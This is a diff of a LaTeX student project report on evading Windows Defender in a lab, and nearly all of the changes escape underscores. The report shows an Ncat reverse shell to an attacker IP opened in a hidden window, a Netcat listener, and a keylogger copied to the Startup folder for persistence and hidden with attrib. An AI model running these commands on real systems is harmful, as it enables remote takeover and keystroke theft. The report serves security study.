@@ -109,7 +109,7 @@
 	\begin{itemize}
 		\item \textbf{Operating System:} Specific version(s) of Windows (e.g., Windows 10/11 Pro, specify build).
 		\item \textbf{Primary Security Solution:} Windows Defender (specify version, update status, and configuration).
-		\item \textbf{Attacker Tools:} A combination of publicly available tools (e.g., Metasploit, Nmap, PowerShell), custom scripts (e.g., `keylog.py`[cite: 3], `cmd_commands.txt` [cite: 4]), and techniques from frameworks like LOLBAS[cite: 251].
+		\item \textbf{Attacker Tools:} A combination of publicly available tools (e.g., Metasploit, Nmap, PowerShell), custom scripts (e.g., `keylog.py`[cite: 3], `cmd\_commands.txt` [cite: 4]), and techniques from frameworks like LOLBAS[cite: 251].
 		\item \textbf{Third-Party Solutions (Optional):} If other AV/EDR solutions were tested, they should be specified.
 		\item \textbf{Exclusions:} This study may not cover all possible evasion techniques or every security product available. The focus is on the selected methods and Windows Defender's response.
 	\end{itemize}
@@ -166,7 +166,7 @@
 		\item \textbf{Definition:} It allows unauthorized remote access to a system, enabling attackers to control the compromised machine, exfiltrate data, or use it as a pivot point for further attacks.
 		\item \textbf{Methods:} Backdoors can be established through various means, including exploiting vulnerabilities, installing malicious software, or using legitimate remote administration tools for malicious purposes. Common methods include:
 		\begin{itemize}
-			\item \textbf{Reverse Shells:} The compromised machine initiates an outbound connection to an attacker-controlled server. This is often used to bypass firewalls that restrict inbound connections. The command `ncat 172.20.10.15 12345 -e cmd.exe` in `cmd_commands.txt` [cite: 253] attempts to establish a reverse shell.
+			\item \textbf{Reverse Shells:} The compromised machine initiates an outbound connection to an attacker-controlled server. This is often used to bypass firewalls that restrict inbound connections. The command `ncat 172.20.10.15 12345 -e cmd.exe` in `cmd\_commands.txt` [cite: 253] attempts to establish a reverse shell.
 			\item \textbf{Bind Shells:} The compromised machine opens a listening port, waiting for the attacker to connect.
 		\end{itemize}
 		\item \textbf{Command and Control (C2):} Attackers use C2 infrastructure to send commands to the backdoor and receive data.
@@ -182,8 +182,8 @@
 			\item \textbf{Obfuscation:} Making scripts difficult to read and analyze.
 			\item \textbf{Fileless Execution:} Running commands or entire scripts directly in memory without writing them to disk.
 		\end{itemize}
-		\item \textbf{Living Off The Land Binaries and Scripts (LOLBAS):} Attackers use legitimate, pre-installed system tools and scripts (binaries, libraries, scripts) to perform malicious actions[cite: 251]. This helps them blend in with normal system activity and avoid detection based on known malicious files. Examples include `cmd.exe`, `powershell.exe`, `rundll32.exe`, `certutil.exe`, etc. The use of `start /min cmd /c` in `cmd_commands.txt` [cite: 252, 253] is an example of attempting to run commands in a hidden window.
-		\item \textbf{Process Hiding Techniques:} Methods to conceal malicious processes from casual inspection by users or basic monitoring tools. This can involve techniques like running processes with hidden windows (e.g., `start /min`), process Doppelgänging, or more advanced rootkit-like methods. The command `attrib +h` in `cmd_commands.txt` [cite: 252, 253] is used for file hiding, which is a related concept.
+		\item \textbf{Living Off The Land Binaries and Scripts (LOLBAS):} Attackers use legitimate, pre-installed system tools and scripts (binaries, libraries, scripts) to perform malicious actions[cite: 251]. This helps them blend in with normal system activity and avoid detection based on known malicious files. Examples include `cmd.exe`, `powershell.exe`, `rundll32.exe`, `certutil.exe`, etc. The use of `start /min cmd /c` in `cmd\_commands.txt` [cite: 252, 253] is an example of attempting to run commands in a hidden window.
+		\item \textbf{Process Hiding Techniques:} Methods to conceal malicious processes from casual inspection by users or basic monitoring tools. This can involve techniques like running processes with hidden windows (e.g., `start /min`), process Doppelgänging, or more advanced rootkit-like methods. The command `attrib +h` in `cmd\_commands.txt` [cite: 252, 253] is used for file hiding, which is a related concept.
 	\end{itemize}
 	
 	\subsubsection{Process Injection and Memory Manipulation}
@@ -206,7 +206,7 @@
 		\item \textbf{Importance:} Achieving persistence is a critical goal for attackers, allowing them to continue their malicious activities over an extended period.
 		\item \textbf{Common Methods:}
 		\begin{itemize}
-			\item \textbf{Startup Locations:} Placing malicious executables or scripts in Windows Startup folders (e.g., `"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"` as seen in `cmd_commands.txt` [cite: 252, 253]).
+			\item \textbf{Startup Locations:} Placing malicious executables or scripts in Windows Startup folders (e.g., `"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"` as seen in `cmd\_commands.txt` [cite: 252, 253]).
 			\item \textbf{Registry Run Keys:} Adding entries to various `Run` or `RunOnce` registry keys (e.g., `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`).
 			\item \textbf{Scheduled Tasks:} Creating scheduled tasks that execute malicious code at specified times or triggers.
 			\item \textbf{Windows Services:} Creating or modifying Windows services to run malicious programs.
@@ -251,9 +251,9 @@
 		\item \textbf{Tools:}
 		\begin{itemize}
 			\item Metasploit Framework [Specify version, if relevant].
-			\item Nmap (for network discovery/verification, installed via WinGet as per `cmd_commands.txt` [cite: 252]).
+			\item Nmap (for network discovery/verification, installed via WinGet as per `cmd\_commands.txt` [cite: 252]).
 			\item Python 3.x environment (for running `keylog.py` [cite: 3] and `activity_logger.py`).
-			\item Netcat (`ncat` used in `cmd_commands.txt` [cite: 253] for establishing reverse shells).
+			\item Netcat (`ncat` used in `cmd\_commands.txt` [cite: 253] for establishing reverse shells).
 			\item Standard command-line utilities.
 			\item Any custom scripts or compilers used.
 		\end{itemize}
@@ -263,7 +263,7 @@
 	\begin{itemize}
 		\item \textbf{Setup:} [Specify, e.g., Isolated virtual network (Host-Only or NAT network in VMware/VirtualBox) to prevent accidental impact on other systems].
 		\item \textbf{Connectivity:} The victim machine had [Specify, e.g., internet connectivity for Windows Defender updates and potential C2 communication, or no internet connectivity if testing offline capabilities]. The attacker machine was on the same virtual network to facilitate direct attacks.
-		\item \textbf{IP Addressing:} Document the IP addresses used for the victim and attacker machines (e.g., Victim: 192.168.X.Y, Attacker: 192.168.X.Z, or as per the Ncat command `172.20.10.15` in `cmd_commands.txt` [cite: 253]).
+		\item \textbf{IP Addressing:} Document the IP addresses used for the victim and attacker machines (e.g., Victim: 192.168.X.Y, Attacker: 192.168.X.Z, or as per the Ncat command `172.20.10.15` in `cmd\_commands.txt` [cite: 253]).
 	\end{itemize}
 	
 	\subsection{Security Solution Configuration}
@@ -296,12 +296,12 @@
 		\item \textbf{Tools and Scripts Used:}
 		\begin{itemize}
 			\item `keylog.py`: A Python script using the `pynput` library to capture keystrokes and save them to `key.txt`[cite: 3].
-			\item `cmd_commands.txt`: A batch script used to automate parts of the deployment, including copying `keylog.py` to the Startup folder for persistence and hiding the script file[cite: 252, 253].
+			\item `cmd\_commands.txt`: A batch script used to automate parts of the deployment, including copying `keylog.py` to the Startup folder for persistence and hiding the script file[cite: 252, 253].
 		\end{itemize}
 		\item \textbf{Step-by-Step Execution Procedure:}
 		\begin{enumerate}
-			\item The `keylog.py` script and `cmd_commands.txt` were transferred to the victim machine (e.g., via a shared folder, USB drive, or downloaded).
-			\item `cmd_commands.txt` was executed on the victim machine.
+			\item The `keylog.py` script and `cmd\_commands.txt` were transferred to the victim machine (e.g., via a shared folder, USB drive, or downloaded).
+			\item `cmd\_commands.txt` was executed on the victim machine.
 			\item The batch script performed the following actions:
 			\begin{itemize}
 				\item Copied `keylog.py` to the user's Startup folder (`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`) to ensure it runs on login[cite: 252].
@@ -314,7 +314,7 @@
 		\item \textbf{Specific Evasion Methods Employed:}
 		\begin{itemize}
 			\item \textbf{Persistence:} Using the Startup folder.
-			\item \textbf{File Hiding:} Using `attrib +h` to hide `keylog.py` and `cmd_commands.txt`.
+			\item \textbf{File Hiding:} Using `attrib +h` to hide `keylog.py` and `cmd\_commands.txt`.
 			\item \textbf{Non-interactive execution} for the keylogger script via the batch file.
 			\item \textbf{Script-based threat:} Relying on a Python script which might be treated differently than a compiled executable by some AVs.
 		\end{itemize}
@@ -325,14 +325,14 @@
 		\item \textbf{Objective of the specific test:} To establish a reverse shell from the victim machine to the attacker machine using Netcat and assess if Windows Defender detects the connection attempt or the tool used.
 		\item \textbf{Tools and Scripts Used:}
 		\begin{itemize}
-			\item `ncat.exe` (part of Nmap, installed via WinGet as per `cmd_commands.txt` [cite: 252]).
-			\item `cmd_commands.txt`: Used to initiate the Ncat reverse shell connection[cite: 253].
+			\item `ncat.exe` (part of Nmap, installed via WinGet as per `cmd\_commands.txt` [cite: 252]).
+			\item `cmd\_commands.txt`: Used to initiate the Ncat reverse shell connection[cite: 253].
 			\item Attacker machine: Netcat listener (`nc -lvnp 12345`).
 		\end{itemize}
 		\item \textbf{Step-by-Step Execution Procedure:}
 		\begin{enumerate}
 			\item On the attacker machine, a Netcat listener was started: `nc -lvnp 12345`.
-			\item On the victim machine, `cmd_commands.txt` was executed.
+			\item On the victim machine, `cmd\_commands.txt` was executed.
 			\item The batch script attempted to install Nmap (if not present) and then initiated the reverse shell: `start /min cmd /c "ncat 172.20.10.15 12345 -e cmd.exe"`[cite: 252, 253]. (Note: IP `172.20.10.15` needs to be the attacker's IP).
 			\item If successful, a command prompt session from the victim machine appeared on the attacker's Netcat listener.
 			\item Commands were executed remotely (e.g., `dir`, `whoami`).
@@ -342,7 +342,7 @@
 			\item \textbf{Reverse Shell:} To bypass potential inbound firewall restrictions on the victim.
 			\item \textbf{Using a legitimate tool (Ncat):} Nmap/Ncat can be used for legitimate network administration, potentially reducing suspicion.
 			\item \textbf{Hidden Window:} `start /min cmd /c` attempts to run the command in a minimized/hidden window[cite: 253].
-			\item \textbf{Automated Installation of Nmap:} The `cmd_commands.txt` script attempts to install Nmap silently using WinGet[cite: 252], which might evade scrutiny if WinGet itself is trusted.
+			\item \textbf{Automated Installation of Nmap:} The `cmd\_commands.txt` script attempts to install Nmap silently using WinGet[cite: 252], which might evade scrutiny if WinGet itself is trusted.
 		\end{itemize}
 	\end{itemize}
 	
@@ -351,13 +351,13 @@
 		\item \textbf{Objective of the specific test:} To execute commands (e.g., file manipulation, reconnaissance) using PowerShell and `cmd.exe` in a way that avoids visible windows and to test detection of these hidden operations.
 		\item \textbf{Tools and Scripts Used:}
 		\begin{itemize}
-			\item `cmd.exe` (via `start /min cmd /c` in `cmd_commands.txt` [cite: 252, 253]).
+			\item `cmd.exe` (via `start /min cmd /c` in `cmd\_commands.txt` [cite: 252, 253]).
 			\item `powershell.exe` (e.g., `powershell -windowstyle hidden -command "Get-Process"`).
 			\item Various LOLBAS (e.g., `certutil.exe` for downloading files, `reg.exe` for registry manipulation).
 		\end{itemize}
 		\item \textbf{Step-by-Step Execution Procedure (Examples):}
 		\begin{enumerate}
-			\item \textbf{Hidden CMD execution:} The `cmd_commands.txt` already uses `start /min cmd /c` for various tasks (keylogger execution, Ncat)[cite: 252, 253]. Additional commands for file creation/deletion were tested using this method.
+			\item \textbf{Hidden CMD execution:} The `cmd\_commands.txt` already uses `start /min cmd /c` for various tasks (keylogger execution, Ncat)[cite: 252, 253]. Additional commands for file creation/deletion were tested using this method.
 			\begin{verbatim}
 				start /min cmd /c "echo test > C:\Users\Public\hidden_file.txt"
 			\end{verbatim}
@@ -426,13 +426,13 @@
 			\item `cmd.exe` and `reg.exe` for Registry manipulation.
 			\item `schtasks.exe` for Scheduled Task creation.
 			\item `keylog.py` or a simple benign script (`payload.bat`/`payload.ps1`) as the persistent payload.
-			\item `cmd_commands.txt` already implements Startup folder persistence for `keylog.py`[cite: 252, 253].
+			\item `cmd\_commands.txt` already implements Startup folder persistence for `keylog.py`[cite: 252, 253].
 		\end{itemize}
 		\item \textbf{Step-by-Step Execution Procedure (Examples):}
 		\begin{enumerate}
 			\item \textbf{Startup Folder (already covered by keylogger):}
 			\begin{itemize}
-				\item `cmd_commands.txt` copies `keylog.py` to `"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"`[cite: 252].
+				\item `cmd\_commands.txt` copies `keylog.py` to `"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"`[cite: 252].
 				\item Verify execution after reboot/re-login.
 			\end{itemize}
 			\item \textbf{Registry Run Key:}
@@ -559,7 +559,7 @@
 		\item \textbf{Relevant Logs:}
 		\begin{itemize}
 			\item Windows Defender Event Logs: [TODO: Specific Event IDs and messages].
-			\item PowerShell Logs (if `cmd_commands.txt` execution was via PowerShell or involved PowerShell): [TODO: Relevant script blocks or module loading].
+			\item PowerShell Logs (if `cmd\_commands.txt` execution was via PowerShell or involved PowerShell): [TODO: Relevant script blocks or module loading].
 			\item Sysmon: [TODO: Event ID 1 (process creation for python.exe, cmd.exe), Event ID 11 (file creation for keylog.py, key.txt), Event ID 12/13 (registry modification if startup was via registry)].
 		\end{itemize}
 		\item \textbf{Evidence of Keylogging Function (if not detected):} [TODO: e.g., "The `key.txt` file was created and successfully captured keystrokes." Snippet from `key.txt` if appropriate and anonymized].
@@ -804,7 +804,7 @@
 		\bibitem{OSSEC7Security} da Silva, B. *Operating Systems and Security: Security* [Lecture Slides, MUB ETRO ELECTRONICS & INFORMATICS]. [cite: 1]
 		\bibitem{ProjectExpect} da Silva, B. *Operating Systems: Projects Proposals: What to Deliver* [Project Guidelines, MUB ETRO ELECTRONICS & INFORMATICS]. [cite: 230]
 		\bibitem{ProjectProp} [Student Names]. *Advanced Security Evasion in Windows with Hidden Commands* [Project Proposal]. [cite: 246]
-		\bibitem{cmdcommands} *cmd_commands.txt* [Provided script]. [cite: 4]
+		\bibitem{cmdcommands} *cmd\_commands.txt* [Provided script]. [cite: 4]
 		\bibitem{keylogpy} *keylog.py* [Provided script using pynput]. [cite: 3]
 		\bibitem{activityloggerpy} *activity_logger.py* [Provided script using psutil, matplotlib]. [cite: 4] % Note: The script uses MsMpEng.exe, but user text says SecurityHealthService.exe
 		
@@ -877,8 +877,8 @@
 	\end{lstlisting}
 	Source: Provided `keylog.py` file[cite: 3].
 	
-	\subsection{cmd_commands.txt}
-	\begin{lstlisting}[language=Batch, caption=cmd_commands.txt - Batch Script for Automation, basicnumbers=left, numberstyle=\tiny\color{gray}, stringstyle=\color{red}, commentstyle=\color{green!70!black}, keywordstyle=\color{blue}, breaklines=true, breakatwhitespace=true, tabsize=4, showstringspaces=false]
+	\subsection{cmd\_commands.txt}
+	\begin{lstlisting}[language=Batch, caption=cmd\_commands.txt - Batch Script for Automation, basicnumbers=left, numberstyle=\tiny\color{gray}, stringstyle=\color{red}, commentstyle=\color{green!70!black}, keywordstyle=\color{blue}, breaklines=true, breakatwhitespace=true, tabsize=4, showstringspaces=false]
 		:: from receiver side please write nc -lvnp port number 
 		
 		@echo off
@@ -895,7 +895,7 @@
 		
 		start /min cmd /c "ncat 172.20.10.15 12345 -e cmd.exe"
 	\end{lstlisting}
-	Source: Provided `cmd_commands.txt` file[cite: 4].
+	Source: Provided `cmd\_commands.txt` file[cite: 4].
 	
 	\subsection{activity_logger.py}
 	\begin{lstlisting}[language=Python, caption=activity_logger.py - Windows Defender Resource Monitor, basicnumbers=left, numberstyle=\tiny\color{gray}, stringstyle=\color{purple}, commentstyle=\color{olive}, keywordstyle=\color{blue}, breaklines=true, breakatwhitespace=true, tabsize=4, showstringspaces=false]
